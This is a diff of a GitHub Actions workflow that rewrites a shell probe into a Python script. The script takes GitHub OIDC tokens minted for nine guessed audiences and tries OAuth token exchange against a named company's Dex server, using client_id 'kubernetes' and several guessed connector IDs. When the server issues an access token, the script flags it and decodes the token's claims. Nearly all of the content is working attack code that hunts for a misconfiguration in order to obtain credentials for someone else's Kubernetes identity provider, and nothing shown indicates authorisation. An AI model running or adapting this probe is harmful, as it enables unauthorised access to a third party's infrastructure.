@@ -6,45 +6,73 @@ permissions:
 jobs:
   probe:
     runs-on: ubuntu-latest
-    env:
-      DEX: https://dex.3209e979-k8s.cloud.together.ai
     steps:
       - name: probe dex token exchange with real GH OIDC token
+        env:
+          DEX: https://dex.3209e979-k8s.cloud.together.ai
         run: |
-          python3 - <<'PY' > /tmp/claims.py.out 2>&1 || true
-          print("noop")
+          python3 - <<'PY'
+          import json, os, base64, urllib.request, urllib.parse, urllib.error
+
+          DEX = os.environ["DEX"]
+          req_url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]
+          req_tok = os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]
+
+          def get_gh_token(aud):
+              u = req_url + "&audience=" + urllib.parse.quote(aud)
+              r = urllib.request.Request(u)
+              r.add_header("Authorization", "bearer " + req_tok)
+              with urllib.request.urlopen(r) as resp:
+                  return json.loads(resp.read())["value"]
+
+          def dec(t):
+              parts = t.split(".")
+              if len(parts) != 3:
+                  return {}
+              def d(s):
+                  return json.loads(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)))
+              return {"hdr": d(parts[0]), "payload": d(parts[1])}
+
+          def post_form(url, form):
+              data = urllib.parse.urlencode(form).encode()
+              r = urllib.request.Request(url, data=data, method="POST")
+              r.add_header("Content-Type", "application/x-www-form-urlencoded")
+              try:
+                  with urllib.request.urlopen(r) as resp:
+                      return resp.status, resp.read().decode()
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read().decode()
+
+          for aud in ["https://dex.3209e979-k8s.cloud.together.ai", "together", "together-ai",
+                      "kubernetes", "together-cli", "dex", "https://api.together.ai",
+                      "sts.together.ai", "https://together.ai"]:
+              try:
+                  tok = get_gh_token(aud)
+              except Exception as e:
+                  print("AUD %s: gh token error %s" % (aud, e))
+                  continue
+              info = dec(tok)
+              p = info.get("payload", {})
+              print("===== AUD=%s len=%d" % (aud, len(tok)))
+              print("  GH hdr=%s" % json.dumps(info.get("hdr", {})))
+              print("  GH iss=%s sub=%s aud=%s owner=%s" % (p.get("iss"), p.get("sub"), p.get("aud"), p.get("repository_owner")))
+              for cid in ["github-actions", "cursor-cloud", "okta"]:
+                  st, body = post_form(DEX + "/token", {
+                      "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
+                      "subject_token": tok,
+                      "subject_token_type": "urn:ietf:params:oauth:token-type:id_token",
+                      "client_id": "kubernetes",
+                      "connector_id": cid,
+                  })
+                  print("  Dex[%s] HTTP %s: %s" % (cid, st, body[:200]))
+                  if '"access_token"' in body:
+                      print("  !!! TOKEN ISSUED connector=%s aud=%s" % (cid, aud))
+                      try:
+                          j = json.loads(body)
+                          claims = dec(j.get("access_token", ""))
+                          print("  DEX hdr=%s" % json.dumps(claims.get("hdr", {})))
+                          print("  DEX claims=%s" % json.dumps(claims.get("payload", {})))
+                      except Exception as e:
+                          print("  decode err %s" % e)
+          print("PROBE DONE")
           PY
-          for AUD in "https://dex.3209e979-k8s.cloud.together.ai" "together" "together-ai" "kubernetes" "together-cli" "dex" "https://api.together.ai" "sts.together.ai" "https://together.ai"; do
-            RESP=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
-            TOK=$(printf '%s' "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
-            echo "===== AUD=$AUD tokenlen=${#TOK}"
-            printf '%s' "$TOK" | python3 -c 'import sys,base64,json
-t=sys.stdin.read().strip().split(".")
-def d(s): return json.loads(base64.urlsafe_b64decode(s+"="*(-len(s)%4)))
-if len(t)==3:
-  print("  GH-HDR:", json.dumps(d(t[0])))
-  p=d(t[1]); print("  GH-ISS:", p.get("iss"), "| GH-SUB:", p.get("sub"), "| GH-AUD:", p.get("aud"), "| OWNER:", p.get("repository_owner"))' 2>/dev/null
-            for CID in github-actions cursor-cloud okta; do
-              R=$(curl -s -m 20 -X POST "$DEX/token" \
-                --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
-                --data-urlencode "subject_token=$TOK" \
-                --data-urlencode "subject_token_type=urn:ietf:params:oauth:token-type:id_token" \
-                -d "client_id=kubernetes" -d "connector_id=$CID")
-              SHORT=$(printf '%s' "$R" | head -c 160)
-              echo "  Dex[$CID]: $SHORT"
-              if printf '%s' "$R" | grep -q '"access_token"'; then
-                echo "  !!! TOKEN ISSUED by connector $CID with audience $AUD"
-                printf '%s' "$R" > /tmp/tok.json
-                python3 -c 'import json,base64
-r=json.load(open("/tmp/tok.json"))
-t=r.get("access_token","").split(".")
-def d(s): return json.loads(base64.urlsafe_b64decode(s+"="*(-len(s)%4)))
-if len(t)==3:
-  print("  DEX-HDR:", json.dumps(d(t[0])))
-  print("  DEX-CLAIMS:", json.dumps(d(t[1])))'
-                echo "  userinfo check:"
-                curl -s -m 15 "$DEX/userinfo" -H "Authorization: Bearer $(python3 -c 'import json;print(json.load(open("/tmp/tok.json"))["access_token"])')" | head -c 400
-                echo
-              fi
-            done
-          done
